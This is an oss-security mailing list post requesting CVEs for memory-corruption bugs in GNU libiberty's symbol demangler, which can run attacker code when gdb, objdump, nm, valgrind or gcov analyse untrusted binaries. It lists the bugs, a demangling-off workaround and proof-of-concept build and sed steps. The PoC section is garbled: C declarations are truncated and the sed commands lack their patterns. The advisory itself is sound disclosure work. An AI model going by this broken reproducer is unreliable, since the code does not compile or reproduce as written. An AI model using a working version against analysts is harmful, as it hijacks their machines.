  oss-security - CVE Request: No Demangling During Analysis of Untrusted Binaries            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 5 May From: Marcel Bรถhme <boehme.marcel@...il.com> To: CVE ID Requests <cve-assign@...re.org>,  oss-security@...ts.openwall.com Cc: Bernd Schmidt <bschmidt@...hat.com>,  florian@...h-krohm.de,  nickc@...hat.com Subject: CVE Request: No Demangling During Analysis of Untrusted Binaries  Hi all,  Attack Vector 1: Security researchers using binary analysis tools, such as Valgrind, GDB, Binutils (e.g., objdump, nm, ..), Gcov, or other LibBFD-based tools on untrusted binaries are vulnerable to arbitrary code execution through several vulnerabilities in Libiberty, the GNU demangling library maintained by GCC. An attacker might modify a program binary such that it executes malicious code upon *analysis* (e.g., an analysis to identify whether the binary is malicious in the first place).   Attack Vector 2: Remote access / DoS via Online IDEs or demangling services.  Workaround: Until the patches propagate to the vulnerable tools, switch off default demangling! E.g., $ echo "set demangle-style none"  >>  ~/.gdbinit $ echo "--demangle=no" >> ~/.valgrindrc  Details and reproducers in the bug reports:  1) Exploitable Buffer Overflow (Fixed in GCC trunk)  2) Invalid Write due to a Use-After-Free (Fixed in GCC trunk)  3) Invalid Write due to Integer Overflow (Fixed in GCC trunk)  4) Write Access Violation (Fixed in GCC trunk)  5) Various Stack Corruptions (Patch under Review)  6) Write Access Violation (Patch under Review)  These vulnerabilities have been found with a more efficient version of the AFL fuzzer. A recent 12h fuzzing session on the patched version did not reveal any more security critical bugs in the demangling library.  POC for ========================  ** GDB and BINUTILS $ cat comileme.c #include <stdio.h> const char World"; int main() {   } $ g++ compileme.c -o compileme $ ./compileme Hello World! $ gdb ./compileme .. $ objdump -x -C ./compileme .. $ nm -C ./compileme ..  ** VALGRIND + GCOV: $ cat compilemetoo.c #include<stdio.h> #include<stdlib.h>  const char*   char *p;   p = (char *) malloc(19);   p = (char *) malloc(12);   free(p);   p = (char *) malloc(16);   return "Hello World!"; }  int main() {       return 0; }  $ g++ compilemetoo.c -o compilemetoo $ sed -bi compilemetoo $ chmod u+x compilemetoo $ ./compilemetoo Hello World! $ valgrind --leak-check=yes ./compilemetoo ..  GCOV: $ g++ -fprofile-arcs -ftest-coverage compilemetoo.c -o compilemetoo $ sed -bi compilemetoo $ sed -bi compilemetoo.gcda $ ./compilemetoo Hello World! $ gcov --version gcov (GCC) $ gcov -mf compilemetoo ..  Best regards, - Marcel  --- Marcel Bรถhme Post-doctoral Research Fellow TSUNAMi Security Research Center National University of Singapore   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      